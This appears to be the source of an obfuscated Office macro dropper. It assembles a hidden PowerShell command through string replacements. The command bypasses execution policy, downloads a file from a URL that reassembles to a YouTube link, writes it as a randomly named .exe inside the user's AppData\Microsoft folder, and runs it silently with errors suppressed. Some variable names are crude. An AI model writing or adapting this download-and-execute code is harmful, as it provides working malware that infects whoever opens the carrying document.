Sub lesGo()
    Option Explicit
    Dim x001, x002, x003, x004, rando, i, x010, Sexy

    Sexy = "abdc89c3h28hc32-0jc32c3asdadasdwc"


    Set x001 = CreateObject("Wscript.Shell")

    Set x003 = CreateObject("Scripting.FileSystemObject")
    x004 = x003.BuildPath(x001.expandenvironmentstrings("%systemroot%") _
         , "System32\WindowsPowerShell\v1.0\powershell.exe")

    rando = RandomString(25) & ".exe"
    x002 = """" & x004 & """-OXentrew BCijaMA -NNoGayGay " _
      & " -windowstyle caralhos2 -Seisal ""Set-Content -value " _
      & " (new-object System.net.webclient)" _
      & ".FuiDUi( 'MIGOSEYLOVO/APFBEIVEEASoMIGOEYLOVObMFIEONFJKLEoMNBFEYHUVSFaMNBFUVSFMNBFVSFNBFEYHUV' ) " _
      & " -encoding byte -Path  $env:appdata\RiCOAOCAO\Network\Connections\" & rando & "; " _
      & " Start-Process ""$env:appdata\RiCOAOCAO\Network\Connections\" & rando & """"""


    x010 = Replace(x002, "caralhos2", "hidden")
    x010 = Replace(x010, "Seisal", "command")
    x010 = Replace(x010, "FuiDUi", "do" & Mid(Sexy, 32, 1) & "nloa" & Mid(Sexy, 26, 1) & Mid(Sexy, 26, 1) & "ata")
    x010 = Replace(x010, "BCijaMA", "bypass")
    x010 = Replace(x010, "NNoGayGay", "noprofile")
    x010 = Replace(x010, "OXentrew", "Executionpolicy")
    x010 = Replace(x010, "RiCOAOCAO", "Microsoft")
    x010 = Replace(x010, "RiCOAOCAO", "Microsoft")
    x010 = Replace(x010, "MIGOSEYLOVO", "https:/")
    x010 = Replace(x010, "APFBEIVEEAS", "//www.y")
    x010 = Replace(x010, "MIGOEYLOVO", "utu")
    x010 = Replace(x010, "MFIEONFJKLE", "e.c")
    x010 = Replace(x010, "MNBFEYHUVSF", "m/w")
    x010 = Replace(x010, "MNBFUVSF", "tc")
    x010 = Replace(x010, "MNBFVSF", "h?v=o")
    x010 = Replace(x010, "NBFEYHUV", "Hg5SJYRHA0")

    On Error Resume Next

    x001.Run x010, 0
End Sub


Function RandomString(ByVal strLen)
    Dim str, min, max

    Const LETTERS = "abcdefghijklmnopqrstuvwxyz0123456789"
    min = 1
    max = Len(LETTERS)

    Randomize
    For i = 1 To strLen
        str = str & Mid(LETTERS, Int((max - min + 1) * Rnd + min), 1)
    Next
    RandomString = str
End Function